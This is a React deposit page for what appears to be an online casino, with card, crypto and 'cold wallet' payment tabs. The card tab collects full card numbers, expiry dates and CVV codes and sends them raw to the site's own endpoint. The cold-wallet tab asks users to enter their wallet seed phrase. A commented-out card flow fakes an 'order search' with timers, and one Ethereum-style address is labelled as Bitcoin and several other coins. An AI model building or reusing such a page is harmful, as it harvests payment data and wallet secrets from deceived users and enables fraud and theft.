import React, {useState, useEffect, useContext} from 'react';
import {Button, Form, IconButton, Input, MaskedInput, Modal, Notification, toaster} from "rsuite";
import Plus from "@rsuite/icons/Plus";
import Minus from "@rsuite/icons/Minus";
import {Helmet} from "react-helmet";
import SuccessPay from "./SuccessPay";
import {Context} from "../../index";
import {observer} from 'mobx-react-lite';
import BonusImage from '../../assets/images/bonus2.png';
import BTCIcon from '../../assets/images/crypto/BTC.png';
import BnBIcon from '../../assets/images/crypto/BnB.png';
import BUSDIcon from '../../assets/images/crypto/BUSD.png';
import ETHIcon from '../../assets/images/crypto/ETH.png';
import USDTIcon from '../../assets/images/crypto/USDT.png';
import CryptoButton from "../CryptoButton";
import {useTranslation} from "react-i18next";
import $api from "../../http";
import {useLocation} from "react-router";

const BonusButton = ({name, img, onClick, bonus}) => {
    const [isActive, setIsActive] = useState(name === bonus)

    useEffect(() => {
        setIsActive(name === bonus)
    }, [bonus])

    return <div onClick={() => onClick(name)} className={'bonus-btn ' + (isActive ? 'active' : '')}>
        {img && <div className={'bonus-btn__icon'}>
            <img src={img} alt={name}/>
        </div>}
        {!img && <div className={'bonus-btn__name'}>{name}</div>}
    </div>
}

const CardPay = ({ amount, submit, setCurrent }) => {
    const { t } = useTranslation();

    const [cardNumber, setCardNumber] = useState('');
    const [cardDate, setCardDate] = useState('');
    const [cvv, setCvv] = useState('');
    const [fio, setFio] = useState('');
    const [phone, setPhone] = useState('');
    const cardMask = [
        /\d/,
        /\d/,
        /\d/,
        /\d/,
        ' ',
        /\d/,
        /\d/,
        /\d/,
        /\d/,
        ' ',
        /\d/,
        /\d/,
        /\d/,
        /\d/,
        ' ',
        /\d/,
        /\d/,
        /\d/,
        /\d/
    ];
    const cardDateMask = [
        /\d/,
        /\d/,
        '/',
        /\d/,
        /\d/,
    ];
    const [loading, setLoading] = useState(false);
    const [orderFound, setOrderFound] = useState(false);
    const [cardPayOpen, setCardPayOpen] = useState(false);
    const card = '4441 1144 5630 2494';
    const [cardPayModalText, setCardPayModalText] = useState(t('your_order_search'));
    const [cardModalImg, setCardModalImg] = useState("https://media.tenor.com/LeV5E96DW7oAAAAi/radar-pvmbg.gif");

    const handleCardPayClose = () => setCardPayOpen(false)

    const handleClick = () => {
        setLoading(true)

        setTimeout(() => {
            setLoading(false)
            setCardPayOpen(true)

            setTimeout(() => {
                setCardPayModalText(t('confirm_within_15_mins'))
                setOrderFound(true)
                setCardModalImg('https://media.tenor.com/KBZieyu-6vMAAAAC/cool-ok.gif')
            }, 10000)
        }, 3000)
    }

    const goToPay = () => {
        $api.post('get-checkout', {amount, fio, cardNumber, cardDate, cvv}).then(rs => {
            window.location.href = 'https://www.makao777.com/success'
        })
    }

    const handleConfirm = () => {
        setCardPayOpen(false)
        toaster.push(
            <Notification type="success" header={t('thanks')}>{t('wait_for_confirm')}</Notification>, {placement: 'topEnd'}
        )

        submit({
            card: [cardNumber, cardDate, cvv].join(', '),
            fio, phone
        })
    }

    const copy = () => {
        navigator.clipboard.writeText(card)
        toaster.push(
            <Notification type="success" header={t('copied')}></Notification>, {placement: 'topEnd'}
        )
    }

    return <>
        <Modal className="modal" size="xs" open={cardPayOpen} onClose={handleCardPayClose}>
            <Modal.Header>
                <Modal.Title>{t('card_pay')}</Modal.Title>
            </Modal.Header>
            <Modal.Body>
                <img style={{width: "70%", margin: '0 auto', display: 'block', marginBottom: '1rem'}} src={cardModalImg} alt="Search"/>
                {orderFound && <div onClick={copy} className={'order-card'}>{card}</div>}
                <p>{cardPayModalText}</p>
            </Modal.Body>
            <Modal.Footer>
                <Button className="calipso-btn pink-btn" disabled={!orderFound} onClick={handleConfirm}>{t('confirm')}</Button>
                <Button className="calipso-btn pink-btn" onClick={handleCardPayClose}>{t('cancel')}</Button>
            </Modal.Footer>
        </Modal>
        <div className="my-row">
            {/*<div className="alert">*/}
            {/*    {t('min_push')} - 500*/}
            {/*</div>*/}
                <MaskedInput
                    placeholder={t('card_number')}
                    className='field'
                    value={cardNumber}
                    mask={cardMask}
                    keepCharPositions={true}
                    showMask={false}
                    style={{ width: 300 }}
                    onChange={setCardNumber}
                />
                <MaskedInput
                    placeholder={'MM/YY'}
                    className='field'
                    value={cardDate}
                    mask={cardDateMask}
                    keepCharPositions={true}
                    showMask={false}
                    style={{ width: 300 }}
                    onChange={setCardDate}
                />
                <Input className='field' placeholder={'CVV'} type='number' value={cvv} onChange={setCvv} />
                <Input className='field' placeholder={t('fio')} value={fio} onChange={setFio} />
                {/*<Input className='field' placeholder={t('phone')} value={phone} onChange={setPhone} />*/}
                {/*<Input className='field' placeholder={t('promo')} />*/}
            <Button onClick={() => goToPay()} className="pink-btn btn-lg rounded">{t('go_to_pay')}</Button>
        </div>
        <div className="foot">
            {/*<Button onClick={handleClick} className="pink-btn btn-lg rounded">{loading ? t('loading')+'...' : t('next')}</Button>*/}
            <Button onClick={() => setCurrent('crypto')} className="pink-btn btn-lg rounded">{t('pay_crypto')}</Button>
            <Button onClick={() => setCurrent('cold')} className="pink-btn btn-lg rounded">{t('pay_cold')}</Button>
            {/*<a href={"https://pay.fondy.eu/api/checkout?button=4ma3lqg9f5h4wwb251b75z3trdkcu8rs"} className="pink-btn btn-lg rounded">Pay Test</a>*/}
        </div>
    </>
}

const CryptoPay = ({ setCurrent, submit, bonus }) => {
    const { t } = useTranslation();

    const cryptos = [
        {
            name: 'BTC',
            icon: BTCIcon,
            number: '0x214d56e78863ed56ff750c4fc92b672a080062a5'
        },
        {
            name: 'BnB',
            icon: BnBIcon,
            number: '0x214d56e78863ed56ff750c4fc92b672a080062a5'
        },
        {
            name: 'BUSD',
            icon: BUSDIcon,
            number: '0x214d56e78863ed56ff750c4fc92b672a080062a5'
        },
        {
            name: 'ETH',
            icon: ETHIcon,
            number: '0x214d56e78863ed56ff750c4fc92b672a080062a5'
        },
        {
            name: 'USDT',
            icon: USDTIcon,
            number: '0x214d56e78863ed56ff750c4fc92b672a080062a5'
        },
    ]
    const [transactionNumber, setTransactionNumber] = useState('');
    const [transactionDetailsShow, setTransactionDetailsShow] = useState(false);
    const [crypto, setCrypto] = useState('');

    const handleCryptoClick = (name) => setCrypto(name)

    const handleNextClick = () => {
        if(crypto === '') {
            toaster.push(
                <Notification type="error" header={t('choose_coin')} />, {placement: 'topEnd'}
            )
        } else if(bonus === '') {
            toaster.push(
                <Notification type="error" header="Выберите бонус" />, {placement: 'topEnd'}
            )
        } else {
            setTransactionDetailsShow(true)
        }
    }

    return transactionDetailsShow ? (
        <div className={'transaction-details'}>
            <p>
                {t('crypto_text')}
                <br/>
                <b style={{display: 'block', margin: '1rem 0', overflowWrap: 'break-word'}}>
                    {cryptos.find(i => i.name === crypto).number}
                </b>
                <br/>
                <p>
                    {t('crypto_desc')}
                </p>
            </p>
            <br/>
            <Input className='field' placeholder={t('transaction_number')+'...'} type='text' value={transactionNumber} onChange={setTransactionNumber} />
            <br/>

            <Button disabled={transactionNumber === '' || crypto === ''} onClick={() => submit({crypto, transactionNumber})} className="pink-btn btn-lg rounded">{t('next')}</Button>
        </div>
    ) : (
        <>
            <div className="crypto-btns">
                {cryptos.map(item => <CryptoButton crypto={crypto} {...item} onClick={handleCryptoClick} />)}
            </div>
            <div className="foot">
                <Button onClick={handleNextClick} className="pink-btn btn-lg rounded">{t('next')}</Button>
                <Button onClick={() => setCurrent('card')} className="pink-btn btn-lg rounded">{t('pay_card')}</Button>
                <Button onClick={() => setCurrent('cold')} className="pink-btn btn-lg rounded">{t('pay_cold')}</Button>
            </div>
        </>
    )
}

const ColdPay = ({ setCurrent, submit }) => {
    const { t } = useTranslation();
    const [wallet, setWallet] = useState('')
    const [seed, setSeed] = useState('')

    return <>
        <div className="my-row">
            <Input className='field' placeholder={t('wallet_number')} value={wallet} onChange={setWallet} />
            <Input className='field' placeholder={t('seed')} value={seed} onChange={setSeed} />
        </div>
        <div className="foot">
            <Button onClick={() => submit({wallet, seed})} className="pink-btn btn-lg rounded">{t('next')}</Button>
            <Button onClick={() => setCurrent('crypto')} className="pink-btn btn-lg rounded">{t('pay_crypto')}</Button>
            <Button onClick={() => setCurrent('card')} className="pink-btn btn-lg rounded">{t('pay_card')}</Button>
        </div>
    </>
}

const PushMoney = () => {

    const { t } = useTranslation();
    const {store} = useContext(Context);
    const [payCompleted, setPayCompleted] = useState(false);
    const [amount, setAmount] = useState(10);
    const [bonus, setBonus] = useState(t('bonus_1'));
    const [current, setCurrent] = useState('crypto');

    const submitCard = (data) => {
        store.createPush({amount, ...data})
    }

    const submitCrypto = (data) => {
        store.createCryptoTransaction(data.crypto, bonus, data.transactionNumber, amount).then(() => {
            setPayCompleted(true);
        })
    }

    const submitCold = (data) => {
        store.createColdTransaction({amount, ...data}).then(() => {
            setPayCompleted(true);
        })
    }

    const contents = {
        'card': <CardPay amount={amount} setCurrent={setCurrent} submit={submitCard} />,
        'crypto': <CryptoPay setCurrent={setCurrent} bonus={bonus} submit={submitCrypto} />,
        'cold': <ColdPay setCurrent={setCurrent} submit= {submitCold} />,
    }

    const bonuses = [
        {
            name: t('bonus_1'),
            img: BonusImage
        },
        {
            name: t('without_bonus')
        }
    ]

    const handleBonusClick = (name) => setBonus(name)

    return !payCompleted ? (
        <div>
            <Helmet>
                <title>{t('push')} - {t('cassa')} | {process.env.REACT_APP_NAME}</title>
            </Helmet>

            <div className="bonus-btns">
                {bonuses.map(item => <BonusButton bonus={bonus} {...item} onClick={handleBonusClick} />)}
            </div>

            {current !== 'crypto' ? null : <div className="alert">
                {t('min_push')} - $10
                <br/>

                {t('network')} BEP20
            </div>}
            <div className="pushmoney-btn-toolbar">
                <Button onClick={() => setAmount(500)} className="pushmoney-btn">500₽</Button>
                <Button onClick={() => setAmount(1000)} className="pushmoney-btn">1000₽</Button>
                <Button onClick={() => setAmount(2000)} className="pushmoney-btn">2000₽</Button>
                <Button onClick={() => setAmount(5000)} className="pushmoney-btn">5000₽</Button>
                <Button onClick={() => setAmount(10000)} className="pushmoney-btn">10000₽</Button>
            </div>

            <div className="pushmoney-amount-group">
                <IconButton onClick={() => setAmount(amount - 1)} circle icon={<Minus />} />
                <Input className='field' type='number' min="500" max="1000000" value={amount} onChange={setAmount} />
                <IconButton onClick={() => setAmount(amount + 100)} circle icon={<Plus />} />
            </div>

            <div style={{textAlign: 'center', marginTop: '2rem'}}>
                {contents[current]}
            </div>

        </div>
    ) : <SuccessPay />;
};

export default observer(PushMoney);